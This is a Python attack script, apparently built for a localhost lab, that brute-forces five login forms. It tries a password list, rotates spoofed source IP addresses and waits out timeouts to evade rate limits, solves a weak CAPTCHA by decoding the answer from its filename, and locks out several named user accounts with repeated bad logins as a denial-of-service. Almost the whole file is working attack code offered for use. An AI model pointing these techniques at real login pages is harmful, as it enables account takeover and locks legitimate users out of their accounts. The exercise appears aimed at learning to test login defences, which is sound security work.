# imports
import json
import time
import base64
import requests
import http.client
import urllib.parse
from termcolor import colored


'''
	Login form bruteforce class:
		each login form has implements different techniques
		to evade the implemented login form security
'''
class Attack():
	def __init__(self):
		# url of website
		self.url = 'http://localhost:5000'

		# username to bruteforce
		self.username = ''

		# list of proxies
		self.proxies = [line.strip() for line in open('proxies', 'r')]

		# list of commonly used passwords
		self.passwords = [line.strip() for line in open('passwords', 'r')]

		self.select()


	# select login form to try to attack
	def select(self):

		# get login form and username
		route = input('Login form number [1, 5]: ')
		self.username = input('Username to attack: ')
		self.url = f'{self.url}/login_{route}'

		# launch attack
		if route == '1':
			self.form_1()

		if route == '2':
			self.form_2()

		if route == '3':
			self.form_3()

		if route == '4':
			self.form_4()

		if route == '5':
			self.form_5()


	# attack login form #1
	def form_1(self):

		# try each password until success status
		index = 0
		for p in self.passwords:
			# create login data
			data = {
				'username': self.username,
				'password': p,
			}

			# send the request
			response = requests.post(self.url, data=data)

			# verify login status
			if b'incorrect' in response.content:
				c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
				print(f'{c} : {self.username, p}')
			else:
				c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
				print(f'\n{c} : {self.username, p}')
				break

			index += 1


	# attack login form #2
	def form_2(self, index=0):
		
		# once ip range ends, change virtual ip address range to next in list
		ranges = [ip for ip in self.proxies if ip.endswith('.254')]
		range_reached = False
  
		# rotate proxies
		for proxy in self.proxies:
			# use current proxy 4 times
			for _ in range(4):
				password = self.passwords[index] 
				data = f'username={self.username}&password={password}'
    
				# bind proxy address, skip if range changed (last ip in range)
				socket = http.client.HTTPConnection('localhost', 5000, source_address=(proxy, 0))
				if range_reached:
					continue 
     
				# send login request
				socket.request('POST', '/login_2', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
				
				response = socket.getresponse()
				response = response.read().decode('utf-8')
				
				# verify login status
				if 'incorrect' in response:
					c = '[' + colored(f'Failed {index}', 'red', attrs=['bold']) + ']'
					print(f'{c} : {self.username, password}')
				else:
					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
					print(f'\n{c} : {self.username, password}')
					return

				# close socket, increase password index
				socket.close()
				if index + 1 >= len(self.passwords):
					return
				else:
					index += 1
     
			# check if proxy range changed, reset range flag
			range_reached = False
			if proxy in ranges:
				range_reached = True
    
		# sleep then attempt next set of passwords
		if index < len(self.passwords):
			c = '[' + colored('Waiting', 'yellow', attrs=['bold']) + ']'
			print(f'\n{c} : will continue in 75 seconds')
			time.sleep(75)
			self.form_2(index)

   
	# attack login form #3
	def form_3(self):
          
		# get captcha end points
		generate_url = 'http://127.0.0.1:5000/generate'		
		solve_url = 'http://127.0.0.1:5000/captcha_submit'		
		
		index = 0
		for p in self.passwords:
			# generate captcha
			captcha = (requests.get(generate_url)).content

			# solve captcha
			captcha_data = json.loads(captcha.decode('utf-8'))
			value = captcha_data['captcha']		
			value = value.split('captcha/')[1].split('.')[0]

			# url and base64 decode captcha
			answer = urllib.parse.unquote(value)
			decoded = base64.b64decode(answer)
			decoded = decoded.decode('utf-8')

			# get expected captcha data
			data = {
				'captcha_input' : decoded,
				'captcha_name'  : value
			}

			# submit captcha
			submission = requests.post(solve_url, data=data)
			if b'correct' in submission.content:
				# display solved captcha
				c = '[' + colored(f'Captcha {index}', 'magenta', attrs=['bold']) + ']'
				print(f'{c} : "{decoded}" solved')
       
				# submit login attempt
				data = {
					'username': self.username,
					'password': p,
				}
				login = requests.post(self.url, data=data)
				
    			# verify login status
				if b'incorrect' in login.content:
					c = '[' + colored(f'Failed  {index}', 'red', attrs=['bold']) + ']'
					print(f'{c} : {self.username, p}')
				else:
					c = '[' + colored('Success', 'green', attrs=['bold', 'blink']) + ']'
					print(f'\n{c} : {self.username, p}')
					break
 
				index += 1
	
 
	# attack login form #4
	def form_4(self):
		'''
			denial-of-service attack, since the attacker can't access 
   			the admin account, the attacker's goal now is to lock the 
      		accounts of all users of the web application
		'''
  
		# lockout all users on application
		self.users = [
			self.username,
			'sarah@secure.com',
			'reece@secure.com',
			'anthony@secure.com',
		]
  
		# try each password until success status
		for user in self.users:
			data = {
				'username': user,
				'password': 'password',
			}
   
			# send garbage password attempt in order to lock account
			for _ in range(20):
				response = requests.post(self.url, data=data)
				c = '[' + colored(f'Attacking', 'blue') + ']'
				print(f'\n{c} : user {user}')
    
				print('server response: ', response.content)
    
    
			c = '[' + colored(f' Locked  ', 'magenta', attrs=['bold', 'blink']) + ']'
			print(f'\n{c} : user {user}')


	# attack login form #5
	def form_5(self):
		pass


# start
if __name__ == '__main__':
	attack = Attack()